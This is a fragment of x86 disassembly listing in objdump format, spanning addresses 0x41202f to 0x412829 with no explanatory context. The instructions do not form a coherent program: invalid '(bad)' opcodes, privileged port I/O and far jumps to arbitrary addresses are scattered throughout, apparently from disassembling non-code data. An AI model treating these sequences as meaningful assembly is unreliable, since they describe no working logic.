  41202f:	and    DWORD PTR [esi+0x37],ebp
  412032:	aam    0x1a
  412034:	pop    ss
  412035:	add    esp,DWORD PTR [ecx+0x12]
  412038:	and    eax,0x67e5ba6b
  41203d:	popf   
  41203e:	push   ebx
  41203f:	mov    al,ds:0x3c23b765
  412044:	aad    0x22
  412046:	aas    
  412047:	repnz xor BYTE PTR [esi+edx*4+0x1361e036],ah
  41204f:	and    DWORD PTR ds:0xeb8f4518,esi
  412055:	(bad)  [ebx]
  412057:	aas    
  412058:	xor    dl,ah
  41205a:	cmp    BYTE PTR [eax+edi*8],cl
  41205d:	lods   al,BYTE PTR ds:[esi]
  41205e:	jo     0x412091
  412060:	icebp  
  412061:	sub    BYTE PTR [eax],al
  412063:	and    al,0x80
  412065:	inc    eax
  412066:	scas   eax,DWORD PTR es:[edi]
  412067:	aas    
  412068:	and    DWORD PTR [ebx-0x1a0e6824],esi
  41206e:	cmp    DWORD PTR [ecx+edi*1-0x7c],ebx
  412072:	pop    edx
  412073:	mov    al,ds:0xa1885696
  412078:	or     bl,bl
  41207a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41207b:	dec    esi
  41207c:	dec    ebp
  41207d:	sbb    BYTE PTR [ecx+0x2c],dl
  412080:	jnp    0x4120e3
  412082:	mov    esi,0x5327e0b
  412087:	push   es
  412088:	out    dx,eax
  412089:	jne    0x41209c
  41208b:	test   al,0x35
  41208d:	adc    eax,0x920fa7aa
  412092:	add    al,0x14
  412094:	push   DWORD PTR [eax]
  412096:	push   ebp
  412097:	pop    ss
  412098:	iret   
  412099:	add    DWORD PTR [esp+edx*4-0x7eff4b83],ebx
  4120a0:	scas   eax,DWORD PTR es:[edi]
  4120a1:	imul   ch
  4120a3:	inc    edx
  4120a4:	inc    esi
  4120a5:	faddp  st(3),st
  4120a7:	sbb    eax,DWORD PTR [edx]
  4120a9:	or     edi,DWORD PTR [edx-0x198cfb29]
  4120af:	pop    esi
  4120b0:	mov    eax,DWORD PTR [eax]
  4120b2:	and    bl,cl
  4120b4:	test   BYTE PTR [ebx+0x16],cl
  4120b7:	lods   eax,DWORD PTR ds:[esi]
  4120b8:	mov    esi,DWORD PTR [edx-0x51]
  4120bb:	dec    edi
  4120bc:	aad    0x46
  4120be:	mov    DWORD PTR [ebx],0x7d557f2c
  4120c4:	and    eax,0x57371f2e
  4120c9:	mov    dh,0x7b
  4120cb:	ds mov ebx,0xc8012b6d
  4120d1:	gs fwait
  4120d3:	xchg   esi,eax
  4120d4:	mov    eax,0xe5499822
  4120d9:	mov    dh,BYTE PTR [edi-0x5f]
  4120dc:	sbb    eax,0x3e45c054
  4120e1:	shr    DWORD PTR [eax-0x21d4b2c5],1
  4120e7:	mov    cl,0xa1
  4120e9:	outs   dx,BYTE PTR ds:[esi]
  4120ea:	cdq    
  4120eb:	sti    
  4120ec:	push   ecx
  4120ed:	sbb    al,al
  4120ef:	inc    ebp
  4120f0:	mov    edx,esi
  4120f2:	int3   
  4120f3:	adc    DWORD PTR [esi-0x4b17940a],esi
  4120f9:	jmp    0xd0b5a7e1
  4120fe:	retf   
  4120ff:	iret   
  412100:	ret    
  412101:	mov    edi,0x238edef4
  412106:	push   cs
  412107:	fmul   QWORD PTR [edi+0x7e66a516]
  41210d:	push   esi
  41210e:	add    ebp,DWORD PTR [esi]
  412110:	mov    cl,0x1
  412112:	out    0x6b,al
  412114:	jecxz  0x41213c
  412116:	(bad)  [ecx]
  412118:	pop    ebp
  412119:	xchg   edi,eax
  41211a:	push   ecx
  41211b:	sbb    esi,DWORD PTR [esi+eax*2]
  41211e:	pop    es
  41211f:	repz lahf 
  412121:	sub    ah,BYTE PTR [bp+di+0x55]
  412125:	add    eax,0x7d5998e6
  41212a:	rol    BYTE PTR [esi-0x72599288],cl
  412130:	loopne 0x412141
  412132:	jbe    0x412166
  412134:	fldenv [ebp+edx*2+0x19]
  412138:	jecxz  0x412198
  41213a:	xchg   ecx,eax
  41213b:	stos   DWORD PTR es:[edi],eax
  41213c:	(bad)  
  41213d:	jo     0x41213e
  41213f:	dec    ecx
  412140:	push   0xffffffc8
  412142:	sub    BYTE PTR [ecx-0x1954e517],ch
  412148:	xor    BYTE PTR [esi+esi*1-0x6f],0x57
  41214d:	jns    0x4121cb
  41214f:	push   ebx
  412150:	mov    bl,0xc8
  412152:	neg    DWORD PTR [ecx]
  412154:	imul   edi,DWORD PTR [ecx-0x7d],0xffffffec
  412158:	pop    ds
  412159:	xchg   ebx,eax
  41215a:	pop    ds
  41215b:	ret    
  41215c:	clc    
  41215d:	push   edx
  41215e:	push   esi
  41215f:	add    DWORD PTR [esi-0x6b150c4c],esp
  412165:	mov    al,ds:0xe57cc42c
  41216a:	lea    esi,[edi+0x28d626c4]
  412170:	xchg   edx,eax
  412171:	in     al,0xa1
  412173:	out    0xd1,al
  412175:	ffreep st(3)
  412177:	sub    bh,BYTE PTR [ebx+0x77469218]
  41217d:	adc    DWORD PTR [ecx-0x38],edi
  412180:	int3   
  412181:	pop    ds
  412182:	sub    al,0xb4
  412184:	neg    BYTE PTR [esi-0x50]
  412187:	int    0x54
  412189:	cmp    BYTE PTR [edx],0xda
  41218c:	adc    esp,edi
  41218e:	sbb    DWORD PTR ds:[edx-0x2c],esi
  412192:	mov    DWORD PTR [edx-0x409c5507],ecx
  412198:	cmp    DWORD PTR [ebp-0x795f5a0d],0x10
  41219f:	out    0x38,eax
  4121a1:	test   al,0x61
  4121a3:	inc    eax
  4121a4:	imul   esi,DWORD PTR [esi+0x41],0x5daf4c30
  4121ab:	inc    ebx
  4121ac:	pop    ebx
  4121ad:	inc    edi
  4121ae:	ja     0x4121af
  4121b0:	loope  0x41217c
  4121b2:	int3   
  4121b3:	mov    ds:0xa7cf044c,eax
  4121b8:	xchg   ebp,eax
  4121b9:	(bad)  [esi]
  4121bb:	loop   0x4121c4
  4121bd:	xchg   ebp,eax
  4121be:	cmc    
  4121bf:	jecxz  0x4121b3
  4121c1:	xchg   ecx,eax
  4121c2:	inc    ecx
  4121c3:	cli    
  4121c4:	retf   0x85da
  4121c7:	pop    esp
  4121c8:	adc    dl,BYTE PTR [ecx-0x389802d6]
  4121ce:	in     al,dx
  4121cf:	mov    bh,0xac
  4121d1:	xor    eax,0x4f5980f8
  4121d6:	repz pop edi
  4121d8:	push   eax
  4121d9:	mov    BYTE PTR [edi],dh
  4121db:	jl     0x4121df
  4121dd:	cmp    BYTE PTR [eax+0x6de75e7],dh
  4121e3:	in     eax,0x4f
  4121e5:	cmp    ah,BYTE PTR ds:0xa1635e78
  4121eb:	dec    eax
  4121ec:	pop    esp
  4121ed:	push   ecx
  4121ee:	out    0x3f,eax
  4121f0:	loop   0x412228
  4121f2:	lock jbe 0x4121c1
  4121f5:	fsubr  st,st(2)
  4121f7:	(bad)  
  4121f8:	pop    ss
  4121f9:	fld    QWORD PTR [esi+0x3f]
  4121fc:	in     eax,0xb
  4121fe:	cmp    esi,DWORD PTR [edx-0x27025ae1]
  412204:	ret    
  412205:	retf   0xe11b
  412208:	cli    
  412209:	and    BYTE PTR [ebx],0x54
  41220c:	push   esi
  41220d:	adc    BYTE PTR [edx+0x64],al
  412210:	(bad)  
  412211:	jp     0x41222f
  412213:	out    0xeb,al
  412215:	je     0x41225f
  412217:	mov    eax,ds:0x9f3b53c6
  41221c:	sub    ch,BYTE PTR ds:0x6c8325df
  412222:	cmc    
  412223:	sub    al,0xdb
  412225:	(bad)  
  412226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412227:	cmp    DWORD PTR [edx],ebx
  412229:	arpl   bx,bx
  41222b:	pop    edi
  41222c:	test   DWORD PTR [eax+0x2a6c4d97],esp
  412232:	or     bl,BYTE PTR [edi-0x2f]
  412235:	ret    0x69f8
  412238:	psrlq  mm3,mm5
  41223b:	dec    eax
  41223c:	(bad)
  41223f:	loope  0x4121c9
  412241:	push   0x5b
  412243:	sub    eax,0x399698fc
  412248:	aad    0x94
  41224a:	sub    esi,edx
  41224c:	fld    QWORD PTR [ecx+0x4c889491]
  412252:	push   0x5a620ef5
  412257:	sub    DWORD PTR [ecx+0x10dde96e],0xdf16d4f2
  412261:	mov    edx,0xff58c9bf
  412266:	dec    ebp
  412267:	and    BYTE PTR [eax-0x2e2e474e],dh
  41226d:	sbb    al,0xb7
  41226f:	inc    ebp
  412270:	loopne 0x41224f
  412272:	in     eax,dx
  412273:	push   ebp
  412274:	loopne 0x41220b
  412276:	pushf  
  412277:	push   ss
  412278:	ficomp DWORD PTR [ecx-0x36]
  41227b:	pop    ebp
  41227c:	push   esi
  41227d:	mov    esp,0xba5e2f8d
  412282:	adc    DWORD PTR [edi-0x15f7c99a],edx
  412288:	pop    ebx
  412289:	cmp    eax,0xa8efcc38
  41228e:	push   ecx
  41228f:	call   DWORD PTR [esi+0x1b]
  412292:	leave  
  412293:	imul   esi,DWORD PTR [ecx+esi*8],0xfd137531
  41229a:	xchg   ebp,eax
  41229b:	dec    edi
  41229c:	lods   al,BYTE PTR ds:[esi]
  41229d:	push   ds
  41229e:	jp     0x4122d9
  4122a0:	sti    
  4122a1:	xor    edi,DWORD PTR [ebp+esi*1+0x7b]
  4122a5:	inc    edx
  4122a6:	add    BYTE PTR [ebx+ebx*8-0x69],dl
  4122aa:	addr16 adc esi,edx
  4122ad:	fcomp  st(3)
  4122af:	xor    DWORD PTR [eax-0x368bf77e],edx
  4122b5:	aam    0x65
  4122b7:	outs   dx,BYTE PTR ds:[esi]
  4122b8:	inc    esi
  4122b9:	xchg   DWORD PTR [ecx-0x2c17b5ea],esi
  4122bf:	lods   eax,DWORD PTR ds:[esi]
  4122c0:	es test eax,0x4d1089b8
  4122c6:	stc    
  4122c7:	in     al,dx
  4122c8:	in     eax,dx
  4122c9:	dec    eax
  4122ca:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  4122cc:	pop    ds
  4122cd:	push   es
  4122ce:	sub    cl,ch
  4122d0:	neg    BYTE PTR [edx+edi*8-0x53]
  4122d4:	adc    DWORD PTR [ebx+0x36d20fcd],0x6b
  4122db:	je     0x41228d
  4122dd:	mov    gs,WORD PTR [eax-0x4a]
  4122e0:	in     al,0x7b
  4122e2:	fnstcw WORD PTR [ecx]
  4122e4:	dec    ecx
  4122e5:	sub    al,0x61
  4122e7:	mul    esp
  4122e9:	sbb    eax,0x13d9cffb
  4122ee:	outs   dx,DWORD PTR ds:[esi]
  4122ef:	sbb    al,0xe2
  4122f1:	mov    edx,0x32492f73
  4122f6:	int3   
  4122f7:	sar    al,cl
  4122f9:	idiv   DWORD PTR [ecx+ecx*2]
  4122fc:	jg     0x41233e
  4122fe:	cmp    al,BYTE PTR [edi]
  412300:	not    BYTE PTR [edx-0x2c]
  412303:	pop    edx
  412304:	cwde   
  412305:	ins    DWORD PTR es:[edi],dx
  412306:	cmp    BYTE PTR [edx-0x8],cl
  412309:	out    0x1d,eax
  41230b:	or     BYTE PTR [esi+0x4f],ah
  41230e:	push   es
  41230f:	add    ecx,eax
  412311:	sahf   
  412312:	and    DWORD PTR [ebp-0xf],edi
  412315:	or     BYTE PTR [edx+0x44ab602d],ch
  41231b:	inc    ebp
  41231c:	dec    ebx
  41231d:	xchg   ebx,eax
  41231e:	hlt    
  41231f:	and    edi,DWORD PTR [edi-0x133d90eb]
  412325:	mov    cl,0x3
  412327:	mov    al,ds:0x37cdfe6a
  41232c:	mov    ah,0x50
  41232e:	mov    eax,0x87f3fd01
  412333:	jge    0x412324
  412335:	repz inc esp
  412337:	add    DWORD PTR ss:[edx-0x43],ebx
  41233b:	ja     0x41233b
  41233d:	(bad)  
  41233f:	(bad)  [esi+0x149a2acc]
  412345:	(bad)  
  412346:	mov    esi,0x3b690795
  41234b:	inc    ebp
  41234c:	aad    0xbf
  41234e:	rcr    al,1
  412350:	hlt    
  412351:	rol    edi,1
  412353:	jle    0x4123cd
  412355:	call   0x91a:0xb287bdcd
  41235c:	mov    ss,WORD PTR [ebp+esi*1+0x13]
  412360:	pop    edx
  412361:	sub    BYTE PTR [eax-0x10],al
  412364:	and    ch,BYTE PTR ds:0x7a19d7d7
  41236a:	or     esi,0xffffffa9
  41236d:	fcomp  DWORD PTR [edx+0xb]
  412370:	or     esp,DWORD PTR [eax-0x6d2d1a13]
  412376:	out    dx,al
  412377:	stos   BYTE PTR es:[edi],al
  412378:	ret    
  412379:	xlat   BYTE PTR ds:[ebx]
  41237a:	sahf   
  41237b:	add    eax,0x341a4bd6
  412380:	or     DWORD PTR [eax-0x36],0x46c5eba
  412387:	pavgw  mm7,mm4
  41238a:	xor    eax,0x566f5fe9
  41238f:	aas    
  412390:	cmp    dh,bl
  412392:	les    eax,FWORD PTR [esi+0x46]
  412395:	xor    DWORD PTR [ebp-0x4ac2c7d7],ebp
  41239b:	test   al,0x48
  41239d:	push   0xffffffb9
  41239f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a0:	call   0xebf9804d
  4123a5:	xchg   ecx,eax
  4123a6:	add    DWORD PTR [ebp+0x7e],esi
  4123a9:	les    ecx,FWORD PTR [ecx-0x746cec4b]
  4123af:	cwde   
  4123b0:	stos   DWORD PTR es:[edi],eax
  4123b1:	aaa    
  4123b2:	test   eax,0x87553f11
  4123b7:	xchg   esi,eax
  4123b8:	mov    eax,0x1d429d19
  4123bd:	call   0xe4813c4b
  4123c2:	jnp    0x4123e9
  4123c4:	fwait
  4123c5:	(bad)  
  4123c6:	push   esi
  4123c7:	mov    ah,0x12
  4123c9:	cmp    al,dl
  4123cb:	loop   0x4123f1
  4123cd:	pop    ds
  4123ce:	inc    esp
  4123cf:	add    esi,0x537f0145
  4123d5:	imul   ebp,edx,0xffffffa3
  4123d8:	mov    edi,0x8893c3ba
  4123dd:	jne    0x41236e
  4123df:	test   cl,bl
  4123e1:	fcmovnbe st,st(4)
  4123e3:	pusha  
  4123e4:	pop    ebx
  4123e5:	ins    WORD PTR es:[edi],dx
  4123e7:	ror    DWORD PTR [ebx-0x74315549],1
  4123ed:	mov    bh,0x39
  4123ef:	sbb    eax,0xc2936816
  4123f4:	in     al,dx
  4123f5:	adc    dh,bl
  4123f7:	repz add al,0x72
  4123fa:	lods   eax,DWORD PTR ds:[esi]
  4123fb:	pop    ebx
  4123fc:	aad    0x31
  4123fe:	pop    eax
  4123ff:	popf   
  412400:	gs push ds
  412402:	jnp    0x41238c
  412404:	push   ecx
  412405:	addr16 and al,0x8d
  412408:	mov    bh,0xa3
  41240a:	jge    0x41238c
  41240c:	mov    BYTE PTR [edi+ebx*1+0x56],bh
  412410:	stos   DWORD PTR es:[edi],eax
  412411:	sub    al,0x87
  412413:	sub    al,0xec
  412415:	mov    edi,0xf51937f3
  41241a:	test   DWORD PTR [eax-0x36],esp
  41241d:	popa   
  41241e:	pop    es
  41241f:	data16 ins BYTE PTR es:[edi],dx
  412421:	mov    esp,0x6582f24a
  412426:	int3   
  412427:	mov    dl,0xc6
  412429:	fsubrp st(0),st
  41242b:	or     ch,BYTE PTR [ebx+0x71]
  41242e:	pop    ebp
  41242f:	fwait
  412430:	add    ah,BYTE PTR ds:[eax+0x50]
  412434:	sar    ecx,0xbd
  412437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412438:	mov    bh,0x85
  41243a:	(bad)  
  41243b:	loop   0x412411
  41243d:	cmc    
  41243e:	pop    esi
  41243f:	cmp    BYTE PTR [esi+0x49],bl
  412442:	add    dh,ah
  412444:	rol    DWORD PTR [esi],0x97
  412447:	imul   esi,DWORD PTR [esi+edx*4],0xffffffd5
  41244b:	jmp    0x41240a
  41244d:	dec    ebx
  41244e:	or     al,0xa7
  412450:	out    dx,al
  412451:	scas   eax,DWORD PTR es:[edi]
  412452:	mov    bh,0x6d
  412454:	lds    edi,FWORD PTR [ebp+0x477f049d]
  41245a:	into   
  41245b:	add    al,BYTE PTR [ebx-0x3]
  41245e:	jg     0x412438
  412460:	repz and eax,0xda25b4ec
  412466:	aam    0xd1
  412468:	sub    BYTE PTR [edi+0x379b4554],cl
  41246e:	jp     0x41244c
  412470:	les    ebp,FWORD PTR [esi+esi*8+0x555711f]
  412477:	and    ecx,DWORD PTR [ecx]
  412479:	cmp    al,0xd8
  41247b:	mov    ebp,0x4dd39baa
  412480:	dec    eax
  412481:	fisttp QWORD PTR [ecx+0x2456346d]
  412487:	and    ebp,ebx
  412489:	loop   0x4124c1
  41248b:	pop    eax
  41248c:	cmc    
  41248d:	mov    ds:0xc2891acf,al
  412492:	(bad)  
  412493:	pop    ss
  412494:	push   ds
  412495:	xchg   edx,eax
  412496:	or     al,0xbe
  412498:	or     al,0x2c
  41249a:	aaa    
  41249b:	mov    cl,0x77
  41249d:	jmp    edx
  41249f:	jbe    0x41248c
  4124a1:	xchg   DWORD PTR [edx+0xe],eax
  4124a4:	xchg   edi,eax
  4124a5:	pop    eax
  4124a6:	iret   
  4124a7:	adc    BYTE PTR fs:[eax],ah
  4124aa:	repnz xor esp,ebp
  4124ad:	lock sahf 
  4124af:	jo     0x41248e
  4124b1:	aas    
  4124b2:	pusha  
  4124b3:	push   edi
  4124b4:	mov    edx,DWORD PTR [edx+0x7a]
  4124b7:	push   es
  4124b8:	jbe    0xe52cc258
  4124be:	mov    BYTE PTR [ecx-0x2a],dl
  4124c1:	fstp   TBYTE PTR [ebp+0x64273001]
  4124c7:	and    dh,0xc8
  4124ca:	bound  edx,QWORD PTR [edx+0x54eb8dd6]
  4124d0:	dec    ebx
  4124d1:	or     DWORD PTR [ecx+0x37],eax
  4124d4:	mov    dl,0x57
  4124d6:	jnp    0x412508
  4124d8:	imul   ebp,DWORD PTR [edx+0x76],0xe51b6007
  4124df:	mov    esp,fs
  4124e1:	jmp    0x41255a
  4124e3:	inc    esi
  4124e4:	adc    al,0xef
  4124e6:	dec    ebp
  4124e7:	xor    ecx,ecx
  4124e9:	adc    al,0xf5
  4124eb:	leave  
  4124ec:	scas   al,BYTE PTR es:[edi]
  4124ed:	jmp    0x82aef6dc
  4124f2:	(bad)  
  4124f3:	fwait
  4124f4:	add    eax,0xb96f05a8
  4124f9:	add    BYTE PTR [esi],bl
  4124fb:	bound  ecx,QWORD PTR [esi]
  4124fd:	retf   
  4124fe:	(bad)  
  4124ff:	xor    eax,0x58480e08
  412504:	mov    al,ds:0xb837b7e2
  412509:	or     esi,ebx
  41250b:	call   0x585b:0xf45480ea
  412512:	push   0x51
  412514:	adc    eax,0x2288bbee
  412519:	dec    edx
  41251a:	test   DWORD PTR ds:0xb9f7302f,eax
  412520:	mov    eax,0xec3a20cd
  412525:	mov    ss,WORD PTR [edx+0x76bbb7b7]
  41252b:	push   cs
  41252c:	adc    BYTE PTR [ebp-0x635d7a35],0x75
  412533:	(bad)  
  412535:	dec    esi
  412536:	mov    dl,0xbf
  412538:	(bad)  
  412539:	mov    ecx,0x3cfbdde6
  41253e:	mov    edi,0x3aee9692
  412543:	or     ch,BYTE PTR [ecx+0x5c]
  412546:	dec    ecx
  412547:	pushf  
  412548:	push   esi
  412549:	cmp    BYTE PTR [ecx+0x3d],dh
  41254c:	lock sub bl,BYTE PTR [eax+0x4f]
  412550:	fcmove st,st(0)
  412552:	retf   
  412553:	loope  0x4125a9
  412555:	arpl   WORD PTR [edi-0x231ab478],bx
  41255b:	pushf  
  41255c:	ror    DWORD PTR [edx+0x63],0x39
  412560:	jbe    0x4125d2
  412562:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  412564:	sub    BYTE PTR [ebx-0x2e157ab5],bh
  41256a:	xor    eax,0xb3638fc3
  41256f:	push   0x9
  412571:	inc    ecx
  412572:	push   ebx
  412573:	ret    0x479c
  412576:	sbb    ebp,DWORD PTR [edi+0x5efd7a2a]
  41257c:	cmp    eax,0x26997cd3
  412581:	js     0x41253c
  412583:	cmp    esi,ebp
  412585:	cmp    BYTE PTR [edx-0x79b62bbe],cl
  41258b:	adc    bh,BYTE PTR [esi]
  41258d:	bound  edi,QWORD PTR [eax+eiz*1]
  412590:	mov    ah,0x7b
  412592:	adc    al,0x2f
  412594:	mov    ecx,0x1dfa02bb
  412599:	in     al,dx
  41259a:	mov    esp,0xd19dd8e9
  41259f:	mov    ah,0xd2
  4125a1:	fcmovu st,st(7)
  4125a3:	jne    0x4125e9
  4125a5:	pop    esp
  4125a6:	mov    eax,0x6d858a34
  4125ab:	cwde   
  4125ac:	sub    DWORD PTR [edx],esp
  4125ae:	ficomp DWORD PTR [esi+edi*2-0x704cf68e]
  4125b5:	out    dx,eax
  4125b6:	and    edx,DWORD PTR [edi-0x7d9dbf68]
  4125bc:	in     al,dx
  4125bd:	jb     0x41260b
  4125bf:	and    bh,BYTE PTR [esi-0x3043f682]
  4125c5:	mov    WORD PTR [ebx+0x4860a25c],es
  4125cb:	out    dx,eax
  4125cc:	adc    al,0x6a
  4125ce:	dec    edi
  4125cf:	mov    ch,0x4a
  4125d1:	stos   BYTE PTR es:[edi],al
  4125d2:	ret    0x3e7
  4125d5:	stos   DWORD PTR es:[di],eax
  4125d7:	ins    BYTE PTR es:[edi],dx
  4125d8:	mov    dl,0x42
  4125da:	cmp    al,0xe0
  4125dc:	ficomp WORD PTR [edx+eiz*4]
  4125df:	push   ss
  4125e0:	gs cs dec ebx
  4125e3:	adc    ecx,DWORD PTR [eax+0x47]
  4125e6:	lea    ebx,[eax]
  4125e8:	(bad)  
  4125e9:	mov    DWORD PTR [ecx+eiz*8],edi
  4125ec:	xlat   BYTE PTR ds:[ebx]
  4125ed:	sub    ebx,DWORD PTR [esi+0x197b5aee]
  4125f3:	bound  ebp,QWORD PTR [edx]
  4125f5:	jmp    0x4125fc
  4125f7:	mov    al,0x60
  4125f9:	mov    bl,0x2d
  4125fb:	dec    esi
  4125fc:	imul   ebp,eax,0xf3d53afa
  412602:	ss repnz stos DWORD PTR es:[edi],eax
  412605:	inc    edi
  412606:	push   ss
  412607:	jnp    0x412665
  412609:	lods   eax,DWORD PTR ds:[esi]
  41260a:	xor    DWORD PTR [ebx],edi
  41260c:	cmp    BYTE PTR [eax+0x49a40771],bh
  412612:	imul   edx,DWORD PTR [ecx+edi*8],0xff7958ac
  412619:	int3   
  41261a:	mov    ds:0x48a6f199,al
  41261f:	xchg   esi,eax
  412620:	mov    edx,0x4312e8b8
  412625:	add    al,0x50
  412627:	icebp  
  412628:	cmp    DWORD PTR [eax+eiz*1-0x34b94e42],edi
  41262f:	jne    0x4125de
  412631:	sbb    ebx,DWORD PTR [edx]
  412633:	push   0xcb28defa
  412638:	jno    0x4125e2
  41263a:	aaa    
  41263b:	test   DWORD PTR [ebp-0x4ef4b5be],0x65624263
  412645:	xlat   BYTE PTR ds:[ebx]
  412646:	add    bl,dh
  412648:	and    al,0x1b
  41264a:	repnz aaa 
  41264c:	retf   0x5123
  41264f:	and    al,BYTE PTR fs:[eax+eax*2]
  412653:	and    al,0x2e
  412655:	enter  0xa593,0x8a
  412659:	push   esi
  41265a:	repz lahf 
  41265c:	dec    ebp
  41265d:	cmova  esi,DWORD PTR [edx]
  412660:	jns    0x412628
  412662:	pop    es
  412663:	loop   0x4126db
  412665:	xor    ebp,ecx
  412667:	loope  0x4126e4
  412669:	hlt    
  41266a:	iret   
  41266b:	dec    eax
  41266c:	cmp    esi,ebp
  41266e:	and    BYTE PTR [ebp+ebp*1-0x7d],al
  412672:	xor    ah,dl
  412674:	stos   DWORD PTR es:[edi],eax
  412675:	inc    edi
  412676:	popa   
  412677:	push   edx
  412678:	jge    0x412643
  41267a:	sbb    al,0x92
  41267c:	fimul  DWORD PTR [ebx]
  41267e:	mov    ch,ch
  412680:	addr16 nop
  412682:	rep ins BYTE PTR es:[edi],dx
  412684:	test   eax,0x3456881c
  412689:	jecxz  0x412679
  41268b:	lea    edx,[edx-0x1c]
  41268e:	and    eax,0xa4651767
  412693:	int3   
  412694:	mov    BYTE PTR [eax+esi*4],al
  412697:	popf   
  412698:	mov    ds:0x2adcfbcd,eax
  41269d:	jbe    0x4126d9
  41269f:	aaa    
  4126a0:	mov    eax,0x4a80f86
  4126a5:	sub    DWORD PTR [edi+0x6023532d],esp
  4126ab:	add    ecx,edx
  4126ad:	loopne 0x41264a
  4126af:	mov    WORD PTR [eax+0x76],fs
  4126b2:	cmp    al,0xea
  4126b4:	mov    dl,0x64
  4126b6:	sbb    eax,0x6a22a82
  4126bb:	mov    edi,0xaeffedf1
  4126c0:	(bad)  
  4126c1:	(bad)  
  4126c2:	push   esp
  4126c3:	mov    WORD PTR [ebx-0x75],gs
  4126c6:	shl    dh,1
  4126c8:	ret    
  4126c9:	into   
  4126ca:	or     edx,DWORD PTR [ebp-0x29]
  4126cd:	mov    dl,0x66
  4126cf:	in     al,dx
  4126d0:	add    edx,edi
  4126d2:	jns    0x412693
  4126d4:	test   BYTE PTR [ebx+edx*1+0x1f],ch
  4126d8:	imul   ebx,DWORD PTR [ebx+0x4d899f8a],0x6c
  4126df:	jbe    0x412667
  4126e1:	mov    esp,0x1f5b8263
  4126e6:	aad    0xd
  4126e8:	into   
  4126e9:	inc    ebp
  4126ea:	jmp    0x412701
  4126ec:	or     DWORD PTR [eax+0x3e2bf813],0x3c771a6a
  4126f6:	test   al,0x9c
  4126f8:	retf   0x4fdc
  4126fb:	ror    dl,1
  4126fd:	daa    
  4126fe:	loop   0x412737
  412700:	bnd jno 0x41276e
  412703:	ret    0xd337
  412706:	cld    
  412707:	(bad)  
  412709:	test   eax,0xa6221279
  41270e:	xor    al,0xbb
  412710:	pop    ebx
  412711:	inc    eax
  412712:	jb     0x412779
  412714:	lock or edi,esi
  412717:	nop
  412718:	xlat   BYTE PTR ds:[ebx]
  412719:	test   al,0x3d
  41271b:	popf   
  41271c:	jge    0x41271f
  41271e:	jmp    0xd2ce:0x4b39ac09
  412725:	pop    eax
  412726:	loop   0x4126e9
  412728:	mov    ebp,0x1798a79c
  41272d:	(bad)  
  41272e:	xor    edi,DWORD PTR [edi]
  412730:	loop   0x4126e8
  412732:	adc    bh,BYTE PTR [edi]
  412734:	(bad)  
  412735:	pop    edi
  412736:	lock repnz cld 
  412739:	sub    BYTE PTR [eax+0x22],cl
  41273c:	push   ss
  41273d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41273e:	sub    al,0x39
  412740:	ins    BYTE PTR es:[edi],dx
  412741:	ins    DWORD PTR es:[edi],dx
  412742:	ja     0x41277f
  412744:	or     eax,DWORD PTR [eax+0x5c]
  412747:	push   ds
  412748:	jmp    0x1d80:0xae5bc576
  41274f:	ret    
  412750:	dec    edx
  412751:	sbb    al,0xcf
  412753:	jl     0x412729
  412755:	(bad)  
  412756:	mov    ecx,0x17d5f355
  41275b:	lock cld 
  41275d:	mov    eax,ds:0xfe16ed3
  412762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412763:	push   ds
  412764:	rcl    DWORD PTR [ebx],0xb
  412767:	add    eax,0xf9aebfe4
  41276c:	ror    DWORD PTR [ebp+eiz*8-0x40],1
  412770:	mov    dh,0xec
  412772:	jns    0x412742
  412774:	xchg   edi,eax
  412775:	push   eax
  412776:	sahf   
  412777:	jnp    0x412718
  412779:	inc    edi
  41277a:	test   al,0x30
  41277c:	dec    eax
  41277d:	lahf   
  41277e:	fadd   DWORD PTR [edi]
  412780:	aaa    
  412781:	imul   ebp,DWORD PTR [edi+0x2ff1b30e],0x914dba09
  41278b:	lds    eax,FWORD PTR [ebx]
  41278d:	je     0x41272b
  41278f:	bnd jl 0x41277a
  412792:	(bad)  
  412794:	setno  BYTE PTR gs:[ebp+edx*2-0x2f]
  41279a:	icebp  
  41279b:	pop    eax
  41279c:	push   0xffffffd7
  41279e:	not    BYTE PTR [esi]
  4127a0:	pop    ss
  4127a1:	push   esi
  4127a2:	icebp  
  4127a3:	xor    BYTE PTR ds:0x888da84b,al
  4127a9:	aaa    
  4127aa:	in     al,dx
  4127ab:	jmp    0x9f1f:0x6eca3f9
  4127b2:	jl     0x412740
  4127b4:	or     edi,DWORD PTR [esi+ebp*8]
  4127b7:	pop    ss
  4127b8:	std    
  4127b9:	pop    ebp
  4127ba:	aaa    
  4127bb:	test   DWORD PTR [ecx],esp
  4127bd:	(bad)  
  4127be:	fs push es
  4127c0:	hlt    
  4127c1:	(bad)  
  4127c2:	jne    0x4127de
  4127c4:	dec    ebx
  4127c5:	loopne 0x412827
  4127c7:	add    ebx,DWORD PTR [edi]
  4127c9:	mov    dh,0x5f
  4127cb:	dec    ecx
  4127cc:	add    eax,DWORD PTR [ebp+0x3bb99cc6]
  4127d2:	mov    ds:0x59de08b3,eax
  4127d7:	ins    BYTE PTR es:[edi],dx
  4127d8:	adc    al,0x72
  4127da:	retf   0xf682
  4127dd:	xchg   ecx,eax
  4127de:	int    0x7b
  4127e0:	jmp    0xbbb06956
  4127e5:	inc    ecx
  4127e6:	and    BYTE PTR [edx],bh
  4127e8:	fistp  DWORD PTR [edi+0x72]
  4127eb:	imul   esp,DWORD PTR [esi+0x3f20d634],0xeaff33fc
  4127f5:	popf   
  4127f6:	and    eax,0x2b
  4127f9:	mov    edx,0x5e63b27f
  4127fe:	push   0xffffffe2
  412800:	add    bl,BYTE PTR [edx+eiz*8+0x6bd86658]
  412807:	push   cs
  412808:	mov    ebx,0x7da5e84
  41280d:	or     ah,al
  41280f:	das    
  412810:	ins    BYTE PTR es:[edi],dx
  412811:	iret   
  412812:	xchg   ecx,eax
  412813:	sahf   
  412814:	(bad)  
  412815:	or     eax,0xd7d83bb8
  41281a:	(bad)  
  41281b:	xchg   edi,eax
  41281c:	arpl   WORD PTR [ebp+0x72de8bc6],sp
  412822:	mov    ebx,0x85218f91
  412827:	les    edx,FWORD PTR [esi]
  412829:	or     edi,DWORD PTR [si-0x3]
